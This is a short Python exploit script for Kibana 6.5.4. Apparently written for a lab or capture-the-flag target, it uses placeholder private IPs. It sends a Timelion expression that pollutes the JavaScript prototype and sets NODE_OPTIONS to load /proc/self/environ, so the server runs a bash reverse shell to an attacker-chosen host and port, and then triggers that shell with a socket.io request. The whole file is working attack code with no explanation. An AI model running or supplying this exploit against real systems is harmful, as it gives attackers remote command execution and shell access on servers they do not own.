import random
import string
import requests

REQ_TIMEOUT = 10

TARGET = "http://10.10.140.186:5601"  # change here
LHOST = "10.11.8.57"     # change here
LPORT = "4242"           # change here
VERSION = "6.5.4"
PROXY = {
    'http': "http://127.0.0.1:8080",
    'https': "https://127.0.0.1:8080",
}


def exploit(target, lhost, lport, version):

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10',
        'kbn-version': version,
        'Content-Type': 'application/json;charset=utf-8'
    }

    # UPLOAD PAYLOAD
    tmp_lock = f'ssh-{"".join([random.choice(string.ascii_lowercase) for _ in range(12)])}'

    rev_shell = r'''/bin/bash -c \\'/bin/bash -i >& /dev/tcp/%s/%s 0>&1\\';''' % (
        lhost, lport)

    payload = r'''{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"if [ ! -f /tmp/%s ]; then touch /tmp/%s && ''' % (tmp_lock, tmp_lock)
    payload += rev_shell + \
        r''' fi\");process.exit()//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-1m","to":"now","mode":"quick","interval":"auto","timezone":"America/Sao_Paulo"}}'''

    url = f'{target}/api/timelion/run'
    headers.update({'kbn-xsrf': 'reporting'})
    resp = requests.post(url, data=payload.strip(
        '\n'), verify=False, headers=headers, timeout=REQ_TIMEOUT, proxies=PROXY)
    # print(resp.text)

    if resp.status_code != 200:
        return False

    # TRIGGER PAYLOAD
    url = f'{target}/socket.io/?transport=polling'
    resp = requests.get(url, verify=False, headers=headers,
                        timeout=REQ_TIMEOUT, proxies=PROXY)
    # print(resp.text)
    return (resp.status_code == 200)


result = exploit(TARGET, LHOST, LPORT, VERSION)
print(result)
